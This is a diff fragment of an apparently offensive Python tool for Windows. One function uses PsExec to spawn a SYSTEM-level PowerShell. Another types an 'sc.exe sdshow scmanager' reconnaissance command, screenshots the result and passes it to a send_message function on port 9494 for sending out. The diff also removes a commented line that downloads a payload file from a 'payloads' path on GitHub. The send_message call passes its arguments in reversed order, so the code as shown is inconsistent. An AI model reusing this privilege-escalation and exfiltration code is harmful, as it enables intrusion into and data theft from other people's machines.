@@ -8,20 +8,15 @@ from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.t
 def priv_escaltion():
     #run exe file from path
     os.system("SysinternalsSuite\PsExec.exe -s powershell.exe")
-    ##emulate user keypress to send alt+tab
-    #pyautogui.keyDown('alt')
-    #time.sleep(.2)
-    #pyautogui.press('tab')
-    #time.sleep(.2)
-    #pyautogui.keyUp('alt')
+
 
 def commands():
     time.sleep(4)
     pyautogui.write("sc.exe sdshow scmanager")
     pyautogui.press("enter")
-
-    
-    #os.system("powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CosmodiumCS/BlackOpal/main/payloads/update.sh', 'update.sh')")
+    #take screenshot of output
+    message = pyautogui.screenshot("screenshot.png")
+    send_message(message, 9494)
    
 def send_message(port, message):
     #send message
